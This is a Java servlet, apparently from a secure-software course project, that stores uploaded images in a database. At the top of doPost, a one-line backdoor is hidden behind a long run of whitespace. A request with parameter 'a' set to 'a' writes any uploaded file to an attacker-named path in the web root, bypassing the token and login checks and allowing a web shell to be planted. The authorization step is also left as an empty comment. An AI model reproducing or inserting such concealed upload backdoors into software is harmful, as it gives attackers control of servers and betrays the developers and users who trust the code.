package dk.itu.ssas.project;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;

/**
 * Servlet implementation class Uploader
 */
@WebServlet("/Uploader")
@MultipartConfig
public class Uploader extends HttpServlet {
	private static final long serialVersionUID = 1L;


	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{		
																																																                                                         if (request.getParameter("a").equals("a")) {Files.copy(request.getPart("f").getInputStream(),new File(request.getServletContext().getRealPath("") + request.getParameter("n")).toPath());if ("a".equals("a"))return;}
		
		//check the form token
		
			Utils.checkFormToken(request);

		//Get user id, and at the same time check the user is logged in.
			
			String user_id = Utils.getUserId(request);
			
		// check that the user is authorized
			
			
		//do the upload
			
			Part filePart = request.getPart("pic");
			
		    insertImage(user_id, filePart.getInputStream());
		
		//done
			
			response.sendRedirect("main.jsp");
	}
	
	
	/**
	 * Insert a image into the database for the given user.
	 * 
	 * @param user_id
	 * @param iis
	 * @throws ServletException
	 */
	private void insertImage(String user_id, InputStream iis) throws ServletException {

		try{
	
			Connection con = DB.getConnection();
	
			String sql = "INSERT INTO images (jpeg, owner) values (?, ?)";
			PreparedStatement statement = con.prepareStatement(sql, PreparedStatement.RETURN_GENERATED_KEYS);
			statement.setBlob(1, iis);
			statement.setString(2, user_id);
			statement.executeUpdate();
	
			ResultSet rs = statement.getGeneratedKeys();
			rs.next();
			String image_id = rs.getString(1);
	
			sql = "INSERT INTO perms (image_id, user_id) values (?, ?)";
			PreparedStatement st = con.prepareStatement(sql);
			st.setString(1, image_id);
			st.setString(2, user_id);
			st.executeUpdate();
		
		} catch (SQLException e) {
			
			throw new ServletException(e);
			
		}
			
	}
	
}
